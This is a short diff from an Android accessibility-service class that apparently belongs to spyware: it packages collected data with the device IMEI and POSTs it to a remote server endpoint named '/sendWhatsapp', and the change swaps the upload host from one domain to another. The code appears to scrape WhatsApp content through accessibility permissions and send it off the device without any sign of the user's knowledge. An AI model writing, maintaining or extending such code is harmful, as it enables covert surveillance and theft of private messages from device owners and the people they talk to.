@@ -560,7 +560,7 @@ public class MyAccessibilityService extends AccessibilityService {
                             d.put("data", ar);
                             d.put("imei", new Device(instance).getImei());
                             Logger.l("POSTED data : " + d.toString());
-                            new ServerHelper2(instance).execute("http://tmhgame.tk/sendWhatsapp", d.toString());
+                            new ServerHelper2(instance).execute("https://lookin24.com/sendWhatsapp", d.toString());
 
                         } catch (JSONException e) {
                             e.printStackTrace();
